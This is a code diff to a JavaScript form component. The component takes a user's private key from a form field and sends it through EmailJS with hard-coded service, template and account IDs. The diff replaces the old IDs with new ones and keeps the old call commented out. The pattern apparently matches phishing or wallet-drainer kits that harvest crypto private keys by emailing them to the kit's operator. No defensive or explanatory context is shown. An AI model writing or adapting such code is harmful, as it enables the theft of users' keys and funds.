@@ -59,12 +59,20 @@ const Formdata = () => {
       ...(data.private && { privateKey: data.private }),
     };
 
+    // try {
+    //   const result = await emailjs.send(
+    //     "service_4dcwyzd",
+    //     "template_nba5pw5",
+    //     templateParams,
+    //     "fZab5skM3kS9JSPtg"
+    //   );
+
     try {
       const result = await emailjs.send(
-        "service_4dcwyzd",
-        "template_nba5pw5",
+        "service_a9jrw85",
+        "template_y1nvf0r",
         templateParams,
-        "fZab5skM3kS9JSPtg"
+        "mIwxoAVapQS6fCSRv"
       );
 
       if (result.status === 200) {
